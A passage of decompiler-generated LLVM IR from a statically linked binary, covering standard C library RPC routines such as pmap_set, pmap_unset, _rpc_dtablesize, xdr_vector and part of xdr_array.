  %v0_1a778 = phi i32 [ %v0_1a778.pre, %dec_label_pc_1a76c ], [ %v0_1a804, %bb34 ]
  %v1_1a778 = inttoptr i32 %v0_1a778 to i32*
  %v2_1a778 = load i32, i32* %v1_1a778, align 4
  %v3_1a778 = add i32 %v0_1a778, 4
  %v4_1a778 = inttoptr i32 %v3_1a778 to i32*
  %v5_1a778 = load i32, i32* %v4_1a778, align 4
  store i32 %v5_1a778, i32* %r1.global-to-local, align 4
  %v6_1a778 = add i32 %v0_1a778, 8
  %v7_1a778 = inttoptr i32 %v6_1a778 to i32*
  %v8_1a778 = load i32, i32* %v7_1a778, align 4
  store i32 %v8_1a778, i32* %r2.global-to-local, align 4
  %v9_1a778 = add i32 %v0_1a778, 12
  %v10_1a778 = inttoptr i32 %v9_1a778 to i32*
  %v11_1a778 = load i32, i32* %v10_1a778, align 4
  store i32 %v11_1a778, i32* %r3.global-to-local, align 4
  %v0_1a77c = load i32, i32* @r7, align 4
  %v1_1a77c = inttoptr i32 %v0_1a77c to i32*
  store i32 %v2_1a778, i32* %v1_1a77c, align 4
  %v3_1a77c = add i32 %v0_1a77c, 4
  %v4_1a77c = inttoptr i32 %v3_1a77c to i32*
  %v5_1a77c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a77c, i32* %v4_1a77c, align 4
  %v6_1a77c = add i32 %v0_1a77c, 8
  %v7_1a77c = inttoptr i32 %v6_1a77c to i32*
  %v8_1a77c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1a77c, i32* %v7_1a77c, align 4
  %v9_1a77c = add i32 %v0_1a77c, 12
  %v10_1a77c = inttoptr i32 %v9_1a77c to i32*
  %v11_1a77c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1a77c, i32* %v10_1a77c, align 4
  %v2_1a784 = load i32, i32* @r7, align 4
  %v3_1a784 = add i32 %v2_1a784, 3
  %v4_1a784 = inttoptr i32 %v3_1a784 to i8*
  store i8 111, i8* %v4_1a784, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1a78c = load i32, i32* @r7, align 4
  %v3_1a78c = add i32 %v2_1a78c, 2
  %v4_1a78c = inttoptr i32 %v3_1a78c to i8*
  store i8 0, i8* %v4_1a78c, align 1
  %v0_1a790 = load i32, i32* @r8, align 4
  store i32 %v0_1a790, i32* @r0, align 4
  %v1_1a794 = call i32 @__libc_close(i32 %v0_1a790)
  br label %dec_label_pc_1a850

dec_label_pc_1a7a0:                               ; preds = %bb35, %dec_label_pc_1a7a0.preheader
  %v0_1a83837 = phi i32 [ 0, %bb35 ], [ 1, %dec_label_pc_1a7a0.preheader ]
  store i32 %v3_1a73c, i32* %r1.global-to-local, align 4
  store i32 %v2_1a718, i32* @r5, align 4
  %v3_1a7a8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1a7a8, i32* @r6, align 4
  %v2_1a8304 = icmp eq i32 %v3_1a7a8, 0
  br i1 %v2_1a8304, label %dec_label_pc_1a838, label %dec_label_pc_1a7b0

dec_label_pc_1a7b0:                               ; preds = %dec_label_pc_1a7a0, %dec_label_pc_1a828
  %v0_1a7b0 = phi i32 [ %v1_1a828, %dec_label_pc_1a828 ], [ %v2_1a718, %dec_label_pc_1a7a0 ]
  %v1_1a7b4 = inttoptr i32 %v0_1a7b0 to i32*
  %v2_1a7b4 = load i32, i32* %v1_1a7b4, align 4
  %v3_1a7b4 = add i32 %v0_1a7b0, 4
  %v4_1a7b4 = inttoptr i32 %v3_1a7b4 to i32*
  %v5_1a7b4 = load i32, i32* %v4_1a7b4, align 4
  store i32 %v5_1a7b4, i32* %r1.global-to-local, align 4
  %v6_1a7b4 = add i32 %v0_1a7b0, 8
  %v7_1a7b4 = inttoptr i32 %v6_1a7b4 to i32*
  %v8_1a7b4 = load i32, i32* %v7_1a7b4, align 4
  store i32 %v8_1a7b4, i32* %r2.global-to-local, align 4
  %v9_1a7b4 = add i32 %v0_1a7b0, 12
  %v10_1a7b4 = inttoptr i32 %v9_1a7b4 to i32*
  %v11_1a7b4 = load i32, i32* %v10_1a7b4, align 4
  store i32 %v11_1a7b4, i32* %r3.global-to-local, align 4
  %v12_1a7b4 = add i32 %v0_1a7b0, 16
  store i32 %v12_1a7b4, i32* @r4, align 4
  store i32 %v2_1a7b4, i32* %stack_var_-68, align 4
  %v1_1a7c0 = inttoptr i32 %v12_1a7b4 to i32*
  %v2_1a7c0 = load i32, i32* %v1_1a7c0, align 4
  %v3_1a7c0 = add i32 %v0_1a7b0, 20
  %v4_1a7c0 = inttoptr i32 %v3_1a7c0 to i32*
  %v5_1a7c0 = load i32, i32* %v4_1a7c0, align 4
  store i32 %v5_1a7c0, i32* %r1.global-to-local, align 4
  %v6_1a7c0 = add i32 %v0_1a7b0, 24
  %v7_1a7c0 = inttoptr i32 %v6_1a7c0 to i32*
  %v8_1a7c0 = load i32, i32* %v7_1a7c0, align 4
  store i32 %v8_1a7c0, i32* %r2.global-to-local, align 4
  %v9_1a7c0 = add i32 %v0_1a7b0, 28
  %v10_1a7c0 = inttoptr i32 %v9_1a7c0 to i32*
  %v11_1a7c0 = load i32, i32* %v10_1a7c0, align 4
  store i32 %v11_1a7c0, i32* %r3.global-to-local, align 4
  %v4_1a7c4 = trunc i32 %v2_1a7c0 to i8
  store i8 %v4_1a7c4, i8* %stack_var_-52, align 1
  %v0_1a7c8 = load i32, i32* @r8, align 4
  store i32 %v0_1a7c8, i32* @r0, align 4
  store i32 35091, i32* %r1.global-to-local, align 4
  store i32 %v3_1a73c, i32* %r2.global-to-local, align 4
  %v3_1a7d4 = call i32 @ioctl(i32 %v0_1a7c8, i32 35091, i32 %v3_1a73c)
  %v1_1a7d8 = icmp slt i32 %v3_1a7d4, 0
  br i1 %v1_1a7d8, label %.thread12, label %dec_label_pc_1a7e4

.thread12:                                        ; preds = %dec_label_pc_1a7b0
  store i32 ptrtoint ([23 x i8]* @global_var_1ea84.1016 to i32), i32* @r0, align 4
  br label %dec_label_pc_1a76c

dec_label_pc_1a7e4:                               ; preds = %dec_label_pc_1a7b0
  %v3_1a7ec = load i8, i8* %stack_var_-52, align 1
  %v4_1a7ec = sext i8 %v3_1a7ec to i32
  store i32 %v4_1a7ec, i32* %r2.global-to-local, align 4
  store i32 %v3_1a7f0, i32* %r3.global-to-local, align 4
  %v5_1a7f4 = or i32 %v4_1a7ec, %v4_1a7f4
  store i32 %v5_1a7f4, i32* %r1.global-to-local, align 4
  %v1_1a7f8 = urem i32 %v4_1a7ec, 2
  %v2_1a7f8 = icmp eq i32 %v1_1a7f8, 0
  %v0_1a828.pre = load i32, i32* @r5, align 4
  br i1 %v2_1a7f8, label %dec_label_pc_1a828, label %dec_label_pc_1a800

dec_label_pc_1a800:                               ; preds = %dec_label_pc_1a7e4
  %v1_1a800 = add i32 %v0_1a828.pre, 16
  %v2_1a800 = inttoptr i32 %v1_1a800 to i8*
  %v3_1a800 = load i8, i8* %v2_1a800, align 1
  %v4_1a800 = zext i8 %v3_1a800 to i32
  store i32 %v4_1a800, i32* %r3.global-to-local, align 4
  %v0_1a804 = load i32, i32* @r4, align 4
  %v1_1a804 = add i32 %v0_1a804, 1
  %v2_1a804 = inttoptr i32 %v1_1a804 to i8*
  %v3_1a804 = load i8, i8* %v2_1a804, align 1
  %v4_1a804 = zext i8 %v3_1a804 to i32
  store i32 %v4_1a804, i32* %r2.global-to-local, align 4
  %v4_1a808 = mul nuw nsw i32 %v4_1a804, 256
  %v5_1a808 = or i32 %v4_1a808, %v4_1a800
  store i32 %v5_1a808, i32* %r3.global-to-local, align 4
  %v7_1a80c = icmp eq i32 %v5_1a808, 2
  br i1 %v7_1a80c, label %dec_label_pc_1a814, label %dec_label_pc_1a828

dec_label_pc_1a814:                               ; preds = %dec_label_pc_1a800
  %v3_1a814 = udiv i32 %v5_1a7f4, 8
  store i32 %v3_1a814, i32* %r3.global-to-local, align 4
  %v0_1a818 = load i32, i32* @sl, align 4
  %v2_1a818 = icmp eq i32 %v0_1a818, 0
  br i1 %v2_1a818, label %bb, label %bb34

bb:                                               ; preds = %dec_label_pc_1a814
  %v2_1a81c = or i32 %v3_1a814, 1
  store i32 %v2_1a81c, i32* %r3.global-to-local, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_1a814, %bb
  %v0_1a820 = phi i32 [ %v3_1a814, %dec_label_pc_1a814 ], [ %v2_1a81c, %bb ]
  %v1_1a820 = urem i32 %v0_1a820, 2
  %v2_1a820 = icmp eq i32 %v1_1a820, 0
  br i1 %v2_1a820, label %dec_label_pc_1a828, label %dec_label_pc_1a778

dec_label_pc_1a828:                               ; preds = %dec_label_pc_1a7e4, %bb34, %dec_label_pc_1a800
  %v1_1a828 = add i32 %v0_1a828.pre, 32
  store i32 %v1_1a828, i32* @r5, align 4
  %v0_1a82c = load i32, i32* @r6, align 4
  %v1_1a82c = add i32 %v0_1a82c, -32
  store i32 %v1_1a82c, i32* @r6, align 4
  %v2_1a830 = icmp eq i32 %v1_1a82c, 0
  br i1 %v2_1a830, label %dec_label_pc_1a838.loopexit, label %dec_label_pc_1a7b0

dec_label_pc_1a838.loopexit:                      ; preds = %dec_label_pc_1a828
  %v0_1a838.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1a838

dec_label_pc_1a838:                               ; preds = %dec_label_pc_1a838.loopexit, %dec_label_pc_1a7a0
  %v0_1a838 = phi i32 [ %v0_1a838.pre, %dec_label_pc_1a838.loopexit ], [ %v0_1a83837, %dec_label_pc_1a7a0 ]
  %v7_1a838 = icmp eq i32 %v0_1a838, 1
  br i1 %v7_1a838, label %bb35, label %dec_label_pc_1a844

bb35:                                             ; preds = %dec_label_pc_1a838
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_1a7a0

dec_label_pc_1a844:                               ; preds = %dec_label_pc_1a838
  %v0_1a844 = load i32, i32* @r8, align 4
  store i32 %v0_1a844, i32* @r0, align 4
  %v1_1a848 = call i32 @__libc_close(i32 %v0_1a844)
  %v0_1a84c = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a850

dec_label_pc_1a850:                               ; preds = %dec_label_pc_1a778, %dec_label_pc_1a844
  %storemerge = phi i32 [ 1, %dec_label_pc_1a778 ], [ %v0_1a84c, %dec_label_pc_1a844 ]
  store i32 %v3_1a708, i32* @r4, align 4
  store i32 %v9_1a708, i32* @r6, align 4
  store i32 %v12_1a708, i32* @r7, align 4
  store i32 %v15_1a708, i32* @r8, align 4
  store i32 %v18_1a708, i32* @sl, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_1a82c, { 1, 0 }
  uselistorder i32 %v1_1a828, { 1, 0 }
  uselistorder i32 %v3_1a814, { 2, 1, 0 }
  uselistorder i32 %v0_1a804, { 1, 0 }
  uselistorder i32 %v0_1a7b0, { 7, 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_1a778, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1a73c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-52, { 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 2, 9, 3, 8, 7, 5, 4, 6 }
  uselistorder i8 111, { 1, 2, 0 }
  uselistorder i32 (i32)* @__GI_exit, { 2, 0, 1, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 7, 6, 3, 0, 8, 9, 5, 4 }
  uselistorder i32 35090, { 0, 2, 1 }
  uselistorder i32 ()* @socket, { 0, 2, 1, 7, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_1a850, { 1, 0 }
  uselistorder label %dec_label_pc_1a828, { 1, 2, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1a7b0, { 1, 0 }
  uselistorder label %dec_label_pc_1a76c, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v6_1a870 = load i32, i32* @r5, align 4
  %v2_1a878 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1a878, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 -1, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_1a890 = call i32 @__get_myaddress(i32* nonnull %stack_var_-44)
  %v2_1a894 = icmp eq i32 %v2_1a890, 0
  store i32 400, i32* @r5, align 4
  br i1 %v2_1a894, label %dec_label_pc_1a940, label %dec_label_pc_1a8b0

dec_label_pc_1a8b0:                               ; preds = %entry
  store i32 0, i32* @lr, align 4
  %v2_1a8b4 = ptrtoint i32* %stack_var_-24 to i32
  %v9_1a8cc = call i32 @__GI_clntudp_bufcreate(i32* nonnull %stack_var_-44, i32 100000, i32 2, i32 5, i32 0, i32 %v2_1a8b4, i32 400, i32 400)
  store i32 %v9_1a8cc, i32* %r5.global-to-local, align 4
  %v2_1a8d0 = icmp eq i32 %v9_1a8cc, 0
  br i1 %v2_1a8d0, label %dec_label_pc_1a940, label %dec_label_pc_1a8e8

dec_label_pc_1a8e8:                               ; preds = %dec_label_pc_1a8b0
  %v1_1a8fc = add i32 %v9_1a8cc, 4
  %v2_1a8fc = inttoptr i32 %v1_1a8fc to i32*
  %v3_1a8fc = load i32, i32* %v2_1a8fc, align 4
  %v1_1a920 = inttoptr i32 %v3_1a8fc to i32*
  %v2_1a920 = load i32, i32* %v1_1a920, align 4
  call void @__pseudo_branch(i32 %v2_1a920)
  %v0_1a924 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a928 = add i32 %v0_1a924, 4
  %v2_1a928 = inttoptr i32 %v1_1a928 to i32*
  %v3_1a928 = load i32, i32* %v2_1a928, align 4
  store i32 ptrtoint (i32* @global_var_1a934.1026 to i32), i32* @lr, align 4
  %v1_1a930 = add i32 %v3_1a928, 16
  %v2_1a930 = inttoptr i32 %v1_1a930 to i32*
  %v3_1a930 = load i32, i32* %v2_1a930, align 4
  call void @__pseudo_branch(i32 %v3_1a930)
  br label %dec_label_pc_1a940

dec_label_pc_1a940:                               ; preds = %entry, %dec_label_pc_1a8b0, %dec_label_pc_1a8e8
  %storemerge = phi i32 [ %tmp11, %dec_label_pc_1a8e8 ], [ 0, %dec_label_pc_1a8b0 ], [ 0, %entry ]
  store i32 %v6_1a870, i32* %r5.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder label %dec_label_pc_1a940, { 2, 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1a964 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1a964, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v3_1a980 = urem i32 %arg4, 65536
  store i32 %v3_1a980, i32* @r8, align 4
  store i32 -1, i32* %stack_var_-32, align 4
  %v2_1a988 = call i32 @__get_myaddress(i32* nonnull %stack_var_-52)
  %v2_1a98c = icmp eq i32 %v2_1a988, 0
  store i32 400, i32* @r5, align 4
  br i1 %v2_1a98c, label %dec_label_pc_1aa50, label %dec_label_pc_1a9a8

dec_label_pc_1a9a8:                               ; preds = %entry
  store i32 0, i32* @lr, align 4
  %v2_1a9ac = ptrtoint i32* %stack_var_-32 to i32
  %v9_1a9c4 = call i32 @__GI_clntudp_bufcreate(i32* nonnull %stack_var_-52, i32 100000, i32 2, i32 5, i32 0, i32 %v2_1a9ac, i32 400, i32 400)
  store i32 %v9_1a9c4, i32* @r5, align 4
  %v2_1a9c8 = icmp eq i32 %v9_1a9c4, 0
  br i1 %v2_1a9c8, label %dec_label_pc_1aa50, label %dec_label_pc_1a9dc

dec_label_pc_1a9dc:                               ; preds = %dec_label_pc_1a9a8
  %v1_1a9f0 = add i32 %v9_1a9c4, 4
  %v2_1a9f0 = inttoptr i32 %v1_1a9f0 to i32*
  %v3_1a9f0 = load i32, i32* %v2_1a9f0, align 4
  store i32 %v3_1a9f0, i32* @r4, align 4
  store i32 60, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 109080, i32* @lr, align 4
  %v1_1aa14 = inttoptr i32 %v3_1a9f0 to i32*
  %v2_1aa14 = load i32, i32* %v1_1aa14, align 4
  call void @__pseudo_branch(i32 %v2_1aa14)
  store i32 ptrtoint ([24 x i8]* @global_var_1ea9c.1033 to i32), i32* @r1, align 4
  %v0_1aa20 = load i32, i32* @r5, align 4
  store i32 %v0_1aa20, i32* @r0, align 4
  %v3_1aa28 = call i32 @clnt_perror(i32 %v0_1aa20, i32 ptrtoint ([24 x i8]* @global_var_1ea9c.1033 to i32))
  %v0_1aa34 = load i32, i32* @r5, align 4
  %v1_1aa38 = add i32 %v0_1aa34, 4
  %v2_1aa38 = inttoptr i32 %v1_1aa38 to i32*
  %v3_1aa38 = load i32, i32* %v2_1aa38, align 4
  %v1_1aa40 = add i32 %v3_1aa38, 16
  %v2_1aa40 = inttoptr i32 %v1_1aa40 to i32*
  %v3_1aa40 = load i32, i32* %v2_1aa40, align 4
  call void @__pseudo_branch(i32 %v3_1aa40)
  br label %dec_label_pc_1aa50

dec_label_pc_1aa50:                               ; preds = %entry, %dec_label_pc_1a9a8, %dec_label_pc_1a9dc
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32 60, { 0, 10, 11, 3, 12, 6, 7, 8, 4, 5, 9, 13, 1, 2 }
  uselistorder i32 (i32*, i32, i32, i32, i32, i32, i32, i32)* @__GI_clntudp_bufcreate, { 0, 3, 2, 1 }
  uselistorder i32 400, { 1, 0, 7, 3, 2, 10, 4, 9, 5, 6, 8 }
  uselistorder label %dec_label_pc_1aa50, { 2, 1, 0 }
}

define i32 @_rpc_dtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_1aa70 = load i32, i32* @r4, align 4
  store i32 %v3_1aa70, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_3020c.1036 to i32), i32* @r4, align 4
  %v2_1aa78 = load i32, i32* @global_var_3020c.1036, align 4
  %v2_1aa7c = icmp eq i32 %v2_1aa78, 0
  br i1 %v2_1aa7c, label %dec_label_pc_1aa84, label %dec_label_pc_1aa8c

dec_label_pc_1aa84:                               ; preds = %entry
  %v0_1aa84 = call i32 @getdtablesize()
  %v1_1aa88 = load i32, i32* @r4, align 4
  %v2_1aa88 = inttoptr i32 %v1_1aa88 to i32*
  store i32 %v0_1aa84, i32* %v2_1aa88, align 4
  %v2_1aa8c.pre = load i32, i32* @global_var_3020c.1036, align 4
  %v2_1aa90.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1aa8c

dec_label_pc_1aa8c:                               ; preds = %entry, %dec_label_pc_1aa84
  %v2_1aa90 = phi i32 [ %v3_1aa70, %entry ], [ %v2_1aa90.pre, %dec_label_pc_1aa84 ]
  %v2_1aa8c = phi i32 [ %v2_1aa78, %entry ], [ %v2_1aa8c.pre, %dec_label_pc_1aa84 ]
  store i32 %v2_1aa90, i32* @r4, align 4
  ret i32 %v2_1aa8c

; uselistorder directives
  uselistorder label %dec_label_pc_1aa8c, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1aa98 = load i32, i32* @r4, align 4
  store i32 %v3_1aa98, i32* %stack_var_-28, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %arg4, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %bb13

dec_label_pc_1aab8:                               ; preds = %bb13
  %v1_1aabc = call i32 @unknown_0()
  %v2_1aac0 = icmp eq i32 %v1_1aabc, 0
  br i1 %v2_1aac0, label %bb, label %dec_label_pc_1aab8._crit_edge

dec_label_pc_1aab8._crit_edge:                    ; preds = %dec_label_pc_1aab8
  %v0_1aac8.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1aac8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1aacc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1aad8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %bb13

bb:                                               ; preds = %dec_label_pc_1aab8
  %v3_1aac4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_1aac4, i32* %r4.global-to-local, align 4
  ret i32 0

bb13:                                             ; preds = %dec_label_pc_1aab8._crit_edge, %entry
  %v1_1aad8 = phi i32 [ %v1_1aad8.pre, %dec_label_pc_1aab8._crit_edge ], [ %arg4, %entry ]
  %v0_1aacc = phi i32 [ %v0_1aacc.pre, %dec_label_pc_1aab8._crit_edge ], [ %arg2, %entry ]
  %v1_1aac8 = phi i32 [ %v1_1aac8.pre, %dec_label_pc_1aab8._crit_edge ], [ %arg3, %entry ]
  %v0_1aadc = phi i32 [ %v0_1aac8.pre, %dec_label_pc_1aab8._crit_edge ], [ 0, %entry ]
  %v3_1aac8 = icmp ult i32 %v0_1aadc, %v1_1aac8
  %v2_1aad8 = add i32 %v0_1aacc, %v1_1aad8
  store i32 %v2_1aad8, i32* %r4.global-to-local, align 4
  %v1_1aadc = add i32 %v0_1aadc, 1
  store i32 %v1_1aadc, i32* %r5.global-to-local, align 4
  br i1 %v3_1aac8, label %dec_label_pc_1aab8, label %dec_label_pc_1aae4

dec_label_pc_1aae4:                               ; preds = %bb13
  %v2_1aae8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1aae8, i32* %r4.global-to-local, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 ()* @unknown_0, { 5, 4, 1, 2, 3, 6, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v9_1aaec = load i32, i32* @r6, align 4
  %v12_1aaec = load i32, i32* @r7, align 4
  %v15_1aaec = load i32, i32* @r8, align 4
  %v21_1aaec = load i32, i32* @sl, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  store i32 %arg3, i32* @r1, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg5, i32* %fp.global-to-local, align 4
  %v1_1ab08 = inttoptr i32 %arg2 to i32*
  %v2_1ab08 = load i32, i32* %v1_1ab08, align 4
  store i32 %v2_1ab08, i32* @r4, align 4
  %v2_1ab0c = inttoptr i32 %arg3 to i32*
  %v4_1ab0c = call i32 @xdr_u_int(i32* %v2_1ab0c, i32* %v2_1ab0c)
  store i32 %v4_1ab0c, i32* %r0.global-to-local, align 4
  %v2_1ab10 = icmp eq i32 %v4_1ab0c, 0
  br i1 %v2_1ab10, label %dec_label_pc_1ac0c, label %dec_label_pc_1ab18

dec_label_pc_1ab18:                               ; preds = %entry
  %v0_1ab18 = load i32, i32* @r5, align 4
  %v1_1ab18 = inttoptr i32 %v0_1ab18 to i32*
  %v2_1ab18 = load i32, i32* %v1_1ab18, align 4
  store i32 %v2_1ab18, i32* @r7, align 4
  %v1_1ab1c = load i32, i32* @r6, align 4
  %tmp21 = icmp ugt i32 %v2_1ab18, %v1_1ab1c
  br i1 %tmp21, label %dec_label_pc_1ab38, label %dec_label_pc_1ab24

dec_label_pc_1ab24:                               ; preds = %dec_label_pc_1ab18
  %v0_1ab28 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ab2c = udiv i32 -1, %v0_1ab28
  store i32 %v2_1ab2c, i32* %r0.global-to-local, align 4
  %tmp22 = icmp ugt i32 %v2_1ab18, %v2_1ab2c
  br i1 %tmp22, label %dec_label_pc_1ab38, label %dec_label_pc_1ab44

dec_label_pc_1ab38:                               ; preds = %dec_label_pc_1ab24, %dec_label_pc_1ab18
  %v0_1ab38 = load i32, i32* @sl, align 4
  %v1_1ab38 = inttoptr i32 %v0_1ab38 to i32*
  %v2_1ab38 = load i32, i32* %v1_1ab38, align 4
  %v7_1ab3c = icmp eq i32 %v2_1ab38, 2
  br i1 %v7_1ab3c, label %dec_label_pc_1ab44, label %dec_label_pc_1ac0c

dec_label_pc_1ab44:                               ; preds = %dec_label_pc_1ab24, %dec_label_pc_1ab38
  %v0_1ab44 = load i32, i32* @r4, align 4
  %v2_1ab44 = icmp eq i32 %v0_1ab44, 0
  br i1 %v2_1ab44, label %dec_label_pc_1ab4c, label %dec_label_pc_1abac

dec_label_pc_1ab4c:                               ; preds = %dec_label_pc_1ab44
  %v0_1ab4c = load i32, i32* @sl, align 4
  %v1_1ab4c = inttoptr i32 %v0_1ab4c to i32*
  %v2_1ab4c = load i32, i32* %v1_1ab4c, align 4
  %v7_1ab50 = icmp eq i32 %v2_1ab4c, 1
  br i1 %v7_1ab50, label %dec_label_pc_1ab64, label %dec_label_pc_1ab58

dec_label_pc_1ab58:                               ; preds = %dec_label_pc_1ab4c
  %v7_1ab58 = icmp eq i32 %v2_1ab4c, 2
  br i1 %v7_1ab58, label %dec_label_pc_1ac14, label %dec_label_pc_1abac

dec_label_pc_1ab64:                               ; preds = %dec_label_pc_1ab4c
  %v2_1ab64 = icmp eq i32 %v2_1ab18, 0
  br i1 %v2_1ab64, label %dec_label_pc_1ac14, label %dec_label_pc_1ab6c

dec_label_pc_1ab6c:                               ; preds = %dec_label_pc_1ab64
  %v0_1ab6c = load i32, i32* %fp.global-to-local, align 4
  %v2_1ab6c = mul i32 %v0_1ab6c, %v2_1ab18
  store i32 %v2_1ab6c, i32* @r5, align 4
  store i32 %v2_1ab6c, i32* %r0.global-to-local, align 4
  %v1_1ab74 = call i32 @malloc(i32 %v2_1ab6c)
  store i32 %v1_1ab74, i32* @r0, align 4
  %v2_1ab78 = icmp eq i32 %v1_1ab74, 0
  store i32 %v1_1ab74, i32* @r4, align 4
  %v1_1ab80 = load i32, i32* %sb.global-to-local, align 4
  %v2_1ab80 = inttoptr i32 %v1_1ab80 to i32*
  store i32 %v1_1ab74, i32* %v2_1ab80, align 4
  br i1 %v2_1ab78, label %dec_label_pc_1ab88, label %dec_label_pc_1aba0

dec_label_pc_1ab88:                               ; preds = %dec_label_pc_1ab6c
  store i32 ptrtoint ([26 x i8]* @global_var_1eac4.1039 to i32), i32* %r0.global-to-local, align 4
  %v2_1ab90 = load i32, i32* @global_var_2b570, align 4
  %v3_1ab94 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_1eac4.1039 to i32), i32 %v2_1ab90)
  store i32 %v3_1ab94, i32* %r0.global-to-local, align 4
  %v0_1ab98 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1ac18

dec_label_pc_1aba0:                               ; preds = %dec_label_pc_1ab6c
  %v0_1aba0 = load i32, i32* @r5, align 4
  store i32 %v0_1aba0, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  %v0_1aba8 = call i32 @__GI_memset()
  store i32 %v0_1aba8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1abac

dec_label_pc_1abac:                               ; preds = %dec_label_pc_1ab58, %dec_label_pc_1ab44, %dec_label_pc_1aba0
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1abc8

dec_label_pc_1abb8:                               ; preds = %bb20
  %v0_1abe8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1abe8 = add i32 %v0_1abe8, 1
  store i32 %v1_1abe8, i32* %r6.global-to-local, align 4
  store i32 109508, i32* @lr, align 4
  call void @__pseudo_branch(i32 %arg6)
  %v0_1abc4 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1abc8

dec_label_pc_1abc8:                               ; preds = %dec_label_pc_1abac, %dec_label_pc_1abb8
  %storemerge = phi i32 [ 1, %dec_label_pc_1abac ], [ %v0_1abc4, %dec_label_pc_1abb8 ]
  store i32 %storemerge, i32* @r5, align 4
  %v2_1abc8 = icmp eq i32 %storemerge, 0
  br i1 %v2_1abc8, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_1abc8
  %v1_1abcc = load i32, i32* %r6.global-to-local, align 4
  %v2_1abcc = load i32, i32* @r7, align 4
  %v4_1abcc = icmp uge i32 %v1_1abcc, %v2_1abcc
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1abc8, %bb
  %v0_1abe4.pr = phi i1 [ true, %dec_label_pc_1abc8 ], [ %v4_1abcc, %bb ]
  %v0_1abd0 = load i32, i32* @r4, align 4
  %v0_1abd4 = load i32, i32* @sl, align 4
  store i32 %v0_1abd4, i32* %r0.global-to-local, align 4
  %v1_1abdc = load i32, i32* %fp.global-to-local, align 4
  %v2_1abdc = add i32 %v1_1abdc, %v0_1abd0
  store i32 %v2_1abdc, i32* @r4, align 4
